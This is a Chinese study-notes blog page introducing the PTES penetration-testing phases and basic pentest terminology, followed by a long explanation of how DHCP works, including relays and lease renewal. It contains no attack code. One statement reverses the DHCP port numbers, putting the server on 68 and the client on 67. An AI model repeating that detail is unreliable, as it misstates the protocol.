<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="Carrot">
    <meta name="description" content="[TOC]
生成目录的方式 [TOC]+ 回车
网络安全导论PTES标准前期交互：范围（我司所有信息资产），规则，需求；
情报收集：资产，账号等；
威胁建模：发现脆弱性目标（去判断易受攻击的资产）；
漏洞分析：确定可行方案；
渗透攻击；
后">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>Carrot</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="Carrot" type="application/atom+xml">
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Carrot</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="" class="waves-effect waves-light">

      
      <i class="fas fa-list" style="zoom: 0.6;"></i>
      
      <span>Medias</span>
      <i class="fas fa-chevron-down" aria-hidden="true" style="zoom: 0.6;"></i>
    </a>
    <ul class="sub-nav menus_item_child ">
      
      <li>
        <a href="/music">
          
          <i class="fas fa-music" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Music</span>
        </a>
      </li>
      
      <li>
        <a href="/movies">
          
          <i class="fas fa-film" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Movies</span>
        </a>
      </li>
      
      <li>
        <a href="/books">
          
          <i class="fas fa-book" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Books</span>
        </a>
      </li>
      
      <li>
        <a href="/galleries">
          
          <i class="fas fa-image" style="margin-top: -20px; zoom: 0.6;"></i>
          
          <span>Galleries</span>
        </a>
      </li>
      
    </ul>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Carrot</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="javascript:;">
			
				<i class="fa-fw fas fa-list"></i>
			
			Medias
			<span class="m-icon"><i class="fas fa-chevron-right"></i></span>
		</a>
            <ul  style="background:  ;" >
              
                <li>

                  <a href="/music " style="margin-left:75px">
				  
				   <i class="fa fas fa-music" style="position: absolute;left:50px" ></i>
			      
		          <span>Music</span>
                  </a>
                </li>
              
                <li>

                  <a href="/movies " style="margin-left:75px">
				  
				   <i class="fa fas fa-film" style="position: absolute;left:50px" ></i>
			      
		          <span>Movies</span>
                  </a>
                </li>
              
                <li>

                  <a href="/books " style="margin-left:75px">
				  
				   <i class="fa fas fa-book" style="position: absolute;left:50px" ></i>
			      
		          <span>Books</span>
                  </a>
                </li>
              
                <li>

                  <a href="/galleries " style="margin-left:75px">
				  
				   <i class="fa fas fa-image" style="position: absolute;left:50px" ></i>
			      
		          <span>Galleries</span>
                  </a>
                </li>
              
            </ul>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title"></h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                          <div class="article-tag">
                            <span class="chip bg-color">无标签</span>
                          </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-01-28
                </div>
                

                

                

                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.min.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>[TOC]</p>
<p>生成目录的方式 [TOC]+ 回车</p>
<h1 id="网络安全导论"><a href="#网络安全导论" class="headerlink" title="网络安全导论"></a>网络安全导论</h1><h2 id="PTES标准"><a href="#PTES标准" class="headerlink" title="PTES标准"></a>PTES标准</h2><p>前期交互：范围（我司所有信息资产），规则，需求；</p>
<p>情报收集：资产，账号等；</p>
<p>威胁建模：发现脆弱性目标（去判断易受攻击的资产）；</p>
<p>漏洞分析：确定可行方案；</p>
<p>渗透攻击；</p>
<p>后渗透攻击（深入利用）； </p>
<p>报告：文档输出；</p>
<blockquote>
<p>举个生活中的例子来形象化说明这一标准：</p>
<p>某一天，有两个武士准备比武，你是擂台下的一位观众，两人正在台上摩拳擦掌。这时你用你为数不多的网络安全知识开始类比：</p>
<ul>
<li>前期交互：武士在比武前，约定好哪些武器用，例如不能投毒等，哪些招数可以用？哪些部位可以攻击？点到为止还是拼个你死我活？</li>
<li>情报收集：通过江湖市场，广泛收集对方的弱点和致命之处，甚至可以动用感情线的方法；</li>
<li>威胁建模：根据前面的情报收集，判断我方武士要怎么做才能占于上风；</li>
<li>漏洞分析：在刚开始交互的过程中，逐渐发现对方招式的拆解的方法，并形成一套对付的武林招式；</li>
<li>渗透攻击：针对一些对方的漏洞，利用制定好的一些招式直击要害，进行攻击；</li>
<li>后渗透攻击：先稳住当前的局面，看看能不能再进一步将其制服；</li>
<li>报告：通过一系列的交互，生成一个对待该类对手的武林秘籍；</li>
</ul>
</blockquote>
<p><img src="/WebSecurity.assets/1673963619805.png" alt="1673963619805"></p>
<p><strong>弱口令</strong>的常见组合：简单来说就是能猜到的密码等就是弱口令；</p>
<p><img src="/WebSecurity.assets/1673970040324.png" alt="1673970040324"></p>
<p><strong>Web十大漏洞</strong>：</p>
<p><img src="/WebSecurity.assets/1673970201397.png" alt="1673970201397"></p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>渗透测试是通过模拟模拟黑客的攻击方法，来攻击计算机网路系统是否安全的一种方式。</p>
<p>分为：</p>
<ul>
<li><p>黑盒测试/外部测试</p>
</li>
<li><p>白盒测试/内部测试</p>
</li>
<li><p>灰盒测试/组合测试</p>
<p><strong>常见渗透测试术语</strong></p>
</li>
</ul>
<p>肉鸡:傀儡机，可以随意被控制的电脑或服务器；</p>
<p>木马：一些用来获取用户权限的程序或者代码段；</p>
<p>后门：为了方便二次进入系统留下的非常隐蔽的后门程序；</p>
<p>shell：命令执行环境，通常所说的那Shell，就是拿到对方的命令行环境；</p>
<p>webshell：通过Web入侵的一种脚本工具，可以据此对网站服务得到一定程度的控制；</p>
<p>poc：用来验证漏洞存在的一段代码或程序；</p>
<p>EXP：漏洞利用的一段代码或程序；</p>
<p>Payload：Payload即有效攻击载荷，可以是一段代码，被隐藏并发送的信息；</p>
<p>…<br><img src="/WebSecurity.assets/1674024712337.png" alt="1674024712337"></p>
<h1 id="Nmap工具"><a href="#Nmap工具" class="headerlink" title="Nmap工具"></a>Nmap工具</h1><ul>
<li><ul>
<li>目前最流行的网络扫描工具，不仅能准确探测单台主机的详细情况，而且能高效地对大范围的ip地址段扫描。</li>
<li>能扫描目标网络上有哪些主机上存活的，哪些服务是开放的，甚至知道网络中使用了那种类型的防火墙设备等。</li>
</ul>
</li>
</ul>
<h1 id="DHCP协议"><a href="#DHCP协议" class="headerlink" title="DHCP协议"></a>DHCP协议</h1><blockquote>
<p>前情提要：由于配置虚拟机上面的网络配置出现了一些问题，不得已(doge)看了一下相关知识。</p>
</blockquote>
<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p><strong>动态主机配置协议DHCP（Dynamic Host Configuration Protocol）</strong>是一种网络管理协议，用于集中对用户IP地址进行动态管理和配置。 </p>
<p>简而言之，所谓的<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=DHCP&amp;spm=1001.2101.3001.7020">DHCP</a>指的是动态ip服务，如果不用手动设置的IP地址，使用动态ip也是个不错的选择。特别是在主机比较多的局域网内（容易发生ip冲突），动态ip可以有效解决ip自动分配问题。 </p>
<h2 id="为什么要使用DHCP？"><a href="#为什么要使用DHCP？" class="headerlink" title="为什么要使用DHCP？"></a>为什么要使用DHCP？</h2><p>在IP网络中，每个连接Internet的设备都需要分配唯一的IP地址。DHCP使网络管理员能从中心结点监控和分配IP地址。当某台计算机移到网络中的其它位置时，能自动收到新的IP地址。<strong>DHCP实现的自动化分配IP地址不仅降低了配置和部署设备的时间，同时也降低了发生配置错误的可能性。</strong>另外DHCP服务器可以管理多个网段的配置信息，当某个网段的配置发生变化时，管理员只需要更新DHCP服务器上的相关配置即可，实现了集中化管理。</p>
<p>总体来看，DHCP带来了如下<strong>优势</strong>：</p>
<ul>
<li>准确的IP配置：IP地址配置参数必须准确，并且在处理“ 192.168.XXX.XXX”之类的输入时，很容易出错。另外印刷错误通常很难解决，使用DHCP服务器可以最大程度地降低这种风险。</li>
<li>减少IP地址冲突：每个连接的设备都必须有一个IP地址。但是，每个地址只能使用一次，重复的地址将导致无法连接一个或两个设备的冲突。当手动分配地址时，尤其是在存在大量仅定期连接的端点（例如移动设备）时，可能会发生这种情况。DHCP的使用可确保每个地址仅使用一次。</li>
<li>IP地址管理的自动化：如果没有DHCP，网络管理员将需要手动分配和撤消地址。跟踪哪个设备具有什么地址可能是徒劳的，因为几乎无法理解设备何时需要访问网络以及何时需要离开网络。DHCP允许将其自动化和集中化，因此网络专业人员可以从一个位置管理所有位置。</li>
<li>高效的变更管理：DHCP的使用使更改地址，范围或端点变得非常简单。例如，组织可能希望将其IP寻址方案从一个范围更改为另一个范围。DHCP服务器配置有新信息，该信息将传播到新端点。同样，如果升级并更换了网络设备，则不需要网络配置。</li>
</ul>
<h2 id="DHCP是怎么工作的？"><a href="#DHCP是怎么工作的？" class="headerlink" title="DHCP是怎么工作的？"></a>DHCP是怎么工作的？</h2><p>DHCP协议采用UDP作为传输协议，DHCP客户端发送请求消息到DHCP服务器的68号端口，DHCP服务器回应应答消息给DHCP客户端的67号端口。</p>
<p>只有跟DHCP客户端在同一个网段的DHCP服务器才能收到DHCP客户端广播的DHCP DISCOVER报文。当DHCP客户端与DHCP服务器不在同一个网段时，必须部署DHCP中继来转发DHCP客户端和DHCP服务器之间的DHCP报文。在DHCP客户端看来，DHCP中继就像DHCP服务器；在DHCP服务器看来，DHCP中继就像DHCP客户端。</p>
<p><strong>无中继场景时DHCP客户端首次接入网络的工作原理</strong></p>
<p>如下图所示，在没有部署DHCP中继的场景下，首次接入网络DHCP客户端与DHCP服务器的报文交互过程，该过程称为DHCP报文<strong>四步交互</strong>。</p>
<p><img src="https://download.huawei.com/mdl/image/download?uuid=8816db1db82148bb98166b2d3509dc47" alt="无中继场景时DHCP客户端首次接入网络的报文交互示意图"><br>无中继场景时DHCP客户端首次接入网络的报文交互示意图</p>
<ul>
<li><p>第一步：发现阶段</p>
<p>首次接入网络的DHCP客户端不知道DHCP服务器的IP地址，为了学习到DHCP服务器的IP地址，DHCP客户端以广播方式发送DHCP DISCOVER报文（目的IP地址为255.255.255.255）给同一网段内的所有设备（包括DHCP服务器或中继）。DHCP DISCOVER报文中携带了客户端的MAC地址（<a target="_blank" rel="noopener" href="https://support.huawei.com/hedex/pages/EDOC1100087046AZJ0324D/10/EDOC1100087046AZJ0324D/10/resources/dc/dc_cfg_dhcp_6005.html#ZH-CN_CONCEPT_0176371535__c1">chaddr字段</a>）、需要请求的参数列表选项（<a target="_blank" rel="noopener" href="https://support.huawei.com/hedex/pages/EDOC1100087046AZJ0324D/10/EDOC1100087046AZJ0324D/10/resources/dc/dc_cfg_dhcp_6005.html#ZH-CN_CONCEPT_0176371535__op55">Option55</a>）、广播标志位（<a target="_blank" rel="noopener" href="https://support.huawei.com/hedex/pages/EDOC1100087046AZJ0324D/10/EDOC1100087046AZJ0324D/10/resources/dc/dc_cfg_dhcp_6005.html#ZH-CN_CONCEPT_0176371535__f1">flags字段</a>）等信息。</p>
</li>
<li><p>第二步：提供阶段</p>
<p>与DHCP客户端位于同一网段的DHCP服务器都会接收到DHCP DISCOVER报文，DHCP服务器选择跟接收DHCP DISCOVER报文接口的IP地址处于同一网段的地址池，并且从中选择一个可用的IP地址，然后通过DHCP OFFER报文发送给DHCP客户端。</p>
<p>通常，DHCP服务器的地址池中会指定IP地址的<a target="_blank" rel="noopener" href="https://support.huawei.com/hedex/hdx.do?docid=EDOC1100087046&amp;id=ZH-CN_CONCEPT_0176371534&amp;lang=zh">租期</a>，如果DHCP客户端发送的DHCP DISCOVER报文中携带了期望租期，服务器会将客户端请求的期望租期与其指定的租期进行比较，选择其中时间较短的租期分配给客户端。</p>
</li>
</ul>
<ol>
<li>DHCP服务器上已配置的与客户端MAC地址静态绑定的IP地址。</li>
<li>客户端发送的DHCP DISCOVER报文中<a target="_blank" rel="noopener" href="https://support.huawei.com/hedex/pages/EDOC1100087046AZJ0324D/10/EDOC1100087046AZJ0324D/10/resources/dc/dc_cfg_dhcp_6005.html#ZH-CN_CONCEPT_0176371535__op50">Option50</a>（请求IP地址选项）指定的地址。</li>
<li>地址池内查找“Expired”状态的IP地址，即曾经分配给客户端的超过租期的IP地址。</li>
<li>在地址池内随机查找一个“Idle”状态的IP地址。</li>
<li>如果未找到可供分配的IP地址，则地址池依次自动回收超过租期的（“Expired”状态）和处于冲突状态（“Conflict”状态）的IP地址。回收后如果找到可用的IP地址，则进行分配；否则，DHCP客户端等待应答超时后，重新发送DHCP DISCOVER报文来申请IP地址。</li>
</ol>
<p>  为了防止分配出去的IP地址跟网络中其他客户端的IP地址冲突，DHCP服务器在发送DHCP OFFER报文前通过发送源地址为DHCP服务器IP地址、目的地址为预分配出去IP地址的<a target="_blank" rel="noopener" href="https://info.support.huawei.com/info-finder/encyclopedia/zh/ICMP.html">ICMP</a> ECHO REQUEST报文对分配的IP地址进行地址冲突探测。如果在指定的时间内没有收到应答报文，表示网络中没有客户端使用这个IP地址，可以分配给客户端；如果指定时间内收到应答报文，表示网络中已经存在使用此IP地址的客户端，则把此地址列为冲突地址，然后等待重新接收到DHCP DISCOVER报文后按照前面介绍的选择IP地址的优先顺序重新选择可用的IP地址。</p>
<p>此阶段DHCP服务器分配给客户端的IP地址不一定是最终确定使用的IP地址，因为DHCP OFFER报文发送给客户端等待16秒后如果没有收到客户端的响应，此地址就可以继续分配给其他客户端。通过下面的选择阶段和确认阶段后才能最终确定客户端可以使用的IP地址。</p>
<ul>
<li><p>第三步：选择阶段</p>
<p>如果有多个DHCP服务器向DHCP客户端回应DHCP OFFER报文，则DHCP客户端一般只接收第一个收到的DHCP OFFER报文，然后以广播方式发送DHCP REQUEST报文，该报文中包含客户端想选择的DHCP服务器标识符（即<a target="_blank" rel="noopener" href="https://support.huawei.com/hedex/pages/EDOC1100087046AZJ0324D/10/EDOC1100087046AZJ0324D/10/resources/dc/dc_cfg_dhcp_6005.html#ZH-CN_CONCEPT_0176371535__op54">Option54</a>）和客户端IP地址（即<a target="_blank" rel="noopener" href="https://support.huawei.com/hedex/pages/EDOC1100087046AZJ0324D/10/EDOC1100087046AZJ0324D/10/resources/dc/dc_cfg_dhcp_6005.html#ZH-CN_CONCEPT_0176371535__op50">Option50</a>，填充了接收的DHCP OFFER报文中yiaddr字段的IP地址）。</p>
</li>
</ul>
<p>DHCP客户端广播发送DHCP REQUEST报文通知所有的DHCP服务器，它将选择某个DHCP服务器提供的IP地址，其他DHCP服务器可以重新将曾经分配给客户端的IP地址分配给其他客户端。</p>
<ul>
<li><p>第四步：确认阶段</p>
<p>当DHCP服务器收到DHCP客户端发送的DHCP REQUEST报文后，DHCP服务器回应DHCP ACK报文，表示DHCP REQUEST报文中请求的IP地址（<a target="_blank" rel="noopener" href="https://support.huawei.com/hedex/pages/EDOC1100087046AZJ0324D/10/EDOC1100087046AZJ0324D/10/resources/dc/dc_cfg_dhcp_6005.html#ZH-CN_CONCEPT_0176371535__op50">Option50</a>填充的）分配给客户端使用。</p>
</li>
</ul>
<p>DHCP客户端收到DHCP ACK报文，会广播发送免费ARP报文，探测本网段是否有其他终端使用服务器分配的IP地址，如果在指定时间内没有收到回应，表示客户端可以使用此地址。如果收到了回应，说明有其他终端使用了此地址，客户端会向服务器发送DHCP DECLINE报文，并重新向服务器请求IP地址，同时，服务器会将此地址列为冲突地址。当服务器没有空闲地址可分配时，再选择冲突地址进行分配，尽量减少分配出去的地址冲突。</p>
<p>当DHCP服务器收到DHCP客户端发送的DHCP REQUEST报文后，如果DHCP服务器由于某些原因（例如协商出错或者由于发送REQUEST过慢导致服务器已经把此地址分配给其他客户端）无法分配DHCP REQUEST报文中<a target="_blank" rel="noopener" href="https://support.huawei.com/hedex/pages/EDOC1100087046AZJ0324D/10/EDOC1100087046AZJ0324D/10/resources/dc/dc_cfg_dhcp_6005.html#ZH-CN_CONCEPT_0176371535__op50">Option50</a>填充的IP地址，则发送DHCP NAK报文作为应答，通知DHCP客户端无法分配此IP地址。DHCP客户端需要重新发送DHCP DISCOVER报文来申请新的IP地址。</p>
<p><strong>有中继场景时DHCP客户端首次接入网络的工作原理</strong></p>
<p>有DHCP中继的场景中，首次接入网络的DHCP客户端和DHCP服务器的工作原理与<strong>无中继场景时DHCP客户端首次接入网络的工作原理</strong>相同。主要差异是DHCP中继在DHCP服务器和DHCP客户端之间转发DHCP报文，以保证DHCP服务器和DHCP客户端可以正常交互。下面仅针对DHCP中继的工作原理进行介绍。</p>
<p>如下图所示，在部署DHCP中继的场景下，首次接入网络DHCP客户端与DHCP服务器的报文交互过程。</p>
<p><img src="/WebSecurity.assets/download.png" alt="有中继场景时DHCP客户端首次接入网络的报文交互示意图"><br>有中继场景时DHCP客户端首次接入网络的报文交互示意图</p>
<p>第一步：发现阶段</p>
<ol>
<li>检查DHCP报文中的hops字段，如果大于16，则丢弃DHCP报文；否则，将hops字段加1（表明经过一次DHCP中继），并继续下面的操作。</li>
<li>检查DHCP报文中的giaddr字段。如果是0，将giaddr字段设置为接收DHCP DISCOVER报文的接口IP地址。如果不是0，则不修改该字段，继续下面的操作。</li>
<li>将DHCP报文的目的IP地址改为DHCP服务器或下一跳中继的IP地址，源地址改为中继连接客户端的接口地址，通过路由转发将DHCP报文单播发送到DHCP服务器或下一跳中继。</li>
</ol>
<p>如果DHCP客户端与DHCP服务器之间存在多个DHCP中继，后面的中继接收到DHCP DISCOVER报文的处理流程同前面所述。</p>
<p>第二步：提供阶段</p>
<p>DHCP服务器接收到DHCP DISCOVER报文后，选择与报文中giaddr字段为同一网段的地址池，并为客户端分配IP地址等参数，然后向giaddr字段标识的DHCP中继单播发送DHCP OFFER报文。</p>
<ol>
<li>检查报文中的giaddr字段，如果不是接口的地址，则丢弃该报文；否则，继续下面的操作。</li>
<li>DHCP中继检查报文的广播标志位。如果广播标志位为1，则将DHCP OFFER报文广播发送给DHCP客户端；否则将DHCP OFFER报文单播发送给DHCP客户端。</li>
</ol>
<p>第三步：选择阶段</p>
<p>中继接收到来自客户端的DHCP REQUEST报文的处理过程同无中继场景下的选择阶段。</p>
<p>第四步：确认阶段</p>
<p>中继接收到来自服务器的DHCP ACK报文的处理过程同无中继场景下的确认阶段。</p>
<p><strong>DHCP客户端重用曾经使用过的地址的工作原理</strong></p>
<p>DHCP客户端非首次接入网络时，可以重用曾经使用过的地址。如下图所示，DHCP客户端与DHCP服务器交互DHCP报文，以重新获取之前使用的IP地址等网络参数，该过程称为两步交互。</p>
<p><img src="/WebSecurity.assets/download.png" alt="DHCP客户端重用曾经使用过的IP地址的报文交互过程"><br>DHCP客户端重用曾经使用过的IP地址的报文交互过程</p>
<p>第一步：选择阶段</p>
<p>客户端广播发送包含前一次分配的IP地址的DHCP REQUEST报文，报文中的Option50（请求的IP地址选项）字段填入曾经使用过的IP地址。</p>
<p>第二步：确认阶段</p>
<p>DHCP服务器收到DHCP REQUEST报文后，根据DHCP REQUEST报文中携带的MAC地址来查找有没有相应的租约记录，如果有则返回DHCP ACK报文，通知DHCP客户端可以继续使用这个IP地址。否则，保持沉默，等待客户端重新发送DHCP DISCOVER报文请求新的IP地址。</p>
<p><strong>DHCP客户端更新租期的工作原理</strong></p>
<p>DHCP服务器采用动态分配机制给客户端分配IP地址时，分配出去的IP地址有租期限制。DHCP客户端向服务器申请地址时可以携带期望租期，服务器在分配租期时把客户端期望租期和地址池中租期配置比较，分配其中一个较短的租期给客户端。租期到期或者客户端下线释放地址后，服务器会收回该IP地址，收回的IP地址可以继续分配给其他客户端使用。这种机制可以提高IP地址的利用率，避免客户端下线后IP地址继续被占用。如果DHCP客户端希望继续使用该地址，需要更新IP地址的租期（如延长IP地址租期）。</p>
<p>DHCP客户端更新租期的过程如下图所示。</p>
<p><img src="https://download.huawei.com/mdl/image/download?uuid=83fc3a71b976489b8f74e7d725248d95" alt="DHCP客户端更新租期示意图"><br>DHCP客户端更新租期示意图</p>
<ol>
<li>当租期达到50%（T1）时，DHCP客户端会自动以单播的方式向DHCP服务器发送DHCP REQUEST报文，请求更新IP地址租期。如果收到DHCP服务器回应的DHCP ACK报文，则租期更新成功（即租期从0开始计算）；如果收到DHCP NAK报文，则重新发送DHCP DISCOVER报文请求新的IP地址。</li>
<li>当租期达到87.5%（T2）时，如果仍未收到DHCP服务器的应答，DHCP客户端会自动以广播的方式向DHCP服务器发送DHCP REQUEST报文，请求更新IP地址租期。如果收到DHCP服务器回应的DHCP ACK报文，则租期更新成功（即租期从0开始计算）；如果收到DHCP NAK报文，则重新发送DHCP DISCOVER报文请求新的IP地址。</li>
<li>如果租期时间到时都没有收到服务器的回应，客户端停止使用此IP地址，重新发送DHCP DISCOVER报文请求新的IP地址。</li>
</ol>
